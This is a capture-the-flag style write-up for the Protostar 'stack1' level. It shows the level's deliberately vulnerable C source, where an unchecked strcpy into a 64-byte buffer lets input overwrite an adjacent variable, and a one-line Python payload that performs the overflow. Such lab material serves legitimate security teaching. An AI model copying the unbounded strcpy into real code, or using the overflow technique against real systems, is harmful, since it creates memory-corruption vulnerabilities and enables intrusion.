# Stack1

## Description

This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

This level is at `/opt/protostar/bin/stack1`

### Hints

- If you are unfamiliar with the hexadecimal being displayed, `man ascii` is your friend.
- Protostar is little endian

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

## Approach

In source code, We know that buffer specified with 64 bytes. Also the condition defined that If We modified the address to `0x61626364`. This will be solved.

## Exploitation

Make a payload of 64 bytes characters and Add the address which defined in the condition. Pipe the payload into the binary.

```bash
./stack1 $(python2 -c 'import struct; print "A"*64+struct.pack("I",0x61626364)')
```
